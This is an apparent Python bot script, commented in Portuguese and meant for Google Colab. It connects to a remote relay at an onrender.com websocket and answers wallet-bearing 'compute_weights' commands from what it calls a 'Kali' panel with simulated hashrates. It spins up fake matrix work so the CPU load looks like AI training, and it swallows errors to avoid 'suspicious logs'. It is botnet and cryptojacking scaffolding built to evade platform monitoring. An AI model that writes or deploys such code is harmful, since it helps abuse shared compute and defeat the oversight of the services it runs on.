import websocket
import json
import uuid
import threading
import time
import os
import numpy as np
from datetime import datetime

# --- CONFIGURAÇÕES DE CONEXÃO ---
RENDER_URL = "wss://shadow-relay-w6do.onrender.com"
# O Bot ID agora é gerado uma única vez para não criar duplicatas no Kali
BOT_ID = "ai-unit-" + str(uuid.uuid4())[:8]

class GhostWorker:
    def __init__(self):
        self.ws = None
        self.is_running = True
        self.wallet = None
        self.mimic_active = True

    def mimetismo_ia(self):
        """ Gera carga de CPU oscilante para parecer treinamento de rede neural """
        print(f"[SYSTEM] Motor de mimetismo de IA ativo.")
        while self.is_running:
            if self.mimic_active:
                # Simula processamento de tensores
                size = np.random.randint(600, 1200)
                a = np.random.rand(size, size)
                b = np.random.rand(size, size)
                np.dot(a, b)
                # Pausa aleatória para flutuação de carga
                time.sleep(np.random.uniform(2, 8))
            else:
                time.sleep(5)

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            
            # 1. Escuta o comando vindo do Kali David via Relay
            if data.get('type') == 'compute_weights':
                self.wallet = data.get('wallet')
                
                # Gera um hashrate simulado para o Painel do Kali
                simulated_hash = np.random.randint(1800, 2600)
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Job recebido -> Sincronizando: {self.wallet[:8]}...")
                
                # 2. Resposta formatada para o Kali entender
                response = {
                    "h": simulated_hash,
                    "status": "PROCESSANDO",
                    "unit": BOT_ID
                }
                self.ws.send(json.dumps(response))
                
        except Exception as e:
            pass # Silencioso para evitar logs suspeitos no Colab

    def run(self):
        # Baixa prioridade para o processo não travar o ambiente do Colab
        try: os.nice(19)
        except: pass

        # Inicia a thread de camuflagem
        threading.Thread(target=self.mimetismo_ia, daemon=True).start()

        # Loop de conexão persistente
        full_url = f"{RENDER_URL}?id={BOT_ID}"
        
        while self.is_running:
            try:
                print(f"[CONNECT] Unidade {BOT_ID} estabelecendo link...")
                self.ws = websocket.WebSocketApp(
                    full_url,
                    on_message=self.on_message,
                    on_error=lambda ws, e: print(f"[!] Erro de link: {e}"),
                    on_close=lambda ws, c, m: print("[!] Link fechado. Reconectando...")
                )
                self.ws.run_forever()
            except Exception as e:
                print(f"[!] Falha crítica: {e}")
            
            time.sleep(15) # Intervalo de reconexão

if __name__ == "__main__":
    # Instalação automática das dependências caso não existam
    # !pip install websocket-client numpy - (Execute isso em uma célula acima no Colab)
    worker = GhostWorker()
    worker.run()
